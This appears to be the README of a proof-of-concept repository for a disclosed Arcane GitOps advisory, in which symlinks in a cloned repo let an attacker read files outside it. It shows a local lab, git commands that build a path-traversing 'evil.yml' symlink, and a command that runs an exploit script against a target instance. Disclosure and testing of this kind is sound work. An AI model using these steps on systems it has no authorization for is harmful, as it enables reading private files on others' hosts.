# Arcane GitOps symlink file read: PoC

PoC for **[GHSA-2jcq-885f-253p](https://github.com/getarcaneapp/arcane/security/advisories/GHSA-2jcq-885f-253p#event-1314521)** in [getarcaneapp/arcane](https://github.com/getarcaneapp/arcane):
GitOps reads follow symlinks outside the cloned repo.

- **Affected:** `>= 2.0.0, < 2.8.0` · **Fixed:** v2.8.0 (PR #3570) · **CVSS:** 6.5
- **Reported by:** BlessedRebuS · **Published:** 2026-11-07

<video src="poc/poc.mp4" controls width="100%"></video>

## Test in the Local Lab

Needs `docker`, `git`, `curl`, `python3`.

```bash
./poc/build-poc.sh                              # v2.7.0: expect [+] LEAKED
ARCANE_IMAGE_TAG=v2.8.0 ./poc/build-poc.sh      # v2.8.0: expect the sync to fail
```

## Test Against an External Instance

Only for an instance you own or have written authorization to test.

### Checklist

- [ ] Target runs v2.0.0 to v2.7.x (`GET /api/app-version` → `currentVersion`)
- [ ] A non-admin account with GitOps permission, and its API token
- [ ] A git repo with `compose.yml` and an `evil.yml` symlink that points at the canary (see below)

#### Creating the symlink repo if not existing
If you are a user with local access to the repository you can create a symlink using git commands

```bash
git init repo && cd repo
printf 'services: {}\n' > compose.yml
ln -s ../../../../../../../../../../../../tmp/arcane-canary.txt evil.yml
git add -A && git commit -m init
git -C .. clone --bare repo srv/evil.git
```

Check the link with `git ls-tree HEAD evil.yml`: the mode must be `120000`.

### Run

```bash
ARCANE_URL=http://<target>:<port> ARCANE_TOKEN=<token> ./exploit.sh git://<private-ip>:9418/evil.git
```

`[+] LEAKED` means vulnerable. `[-]` means patched. Fix: upgrade to v2.8.0 or later.

## Files

| File | Purpose |
|---|---|
| [`poc/build-poc.sh`](poc/build-poc.sh) | Local lab: runs Arcane in Docker and the exploit. |
| [`exploit.sh`](exploit.sh) | Exploit against an Arcane instance. |
| [`poc/Dockerfile`](poc/Dockerfile) | All-in-one image: Arcane + git daemon + exploit. |

## Disclaimer
This repository contains offensive security tooling built <u>for educational purpose only</u>